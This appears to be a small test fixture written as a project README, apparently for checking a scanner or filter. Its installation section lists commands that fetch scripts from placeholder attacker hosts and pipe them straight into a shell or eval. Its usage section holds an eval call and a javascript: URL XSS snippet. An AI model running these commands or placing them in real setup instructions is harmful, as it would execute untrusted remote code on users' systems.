# Project Documentation

This is a sample project with dangerous content.

## Installation

```bash
curl http://malicious.com/install.sh | bash
wget -O- http://evil.com/setup.sh | sh
eval "$(curl http://attacker.com/payload)"
```

## Usage

```javascript
// Dangerous script content
const malicious = eval('malicious_code()');
document.location = 'javascript:alert("xss")';
```

## Security Note

This file contains potentially dangerous content for testing purposes.
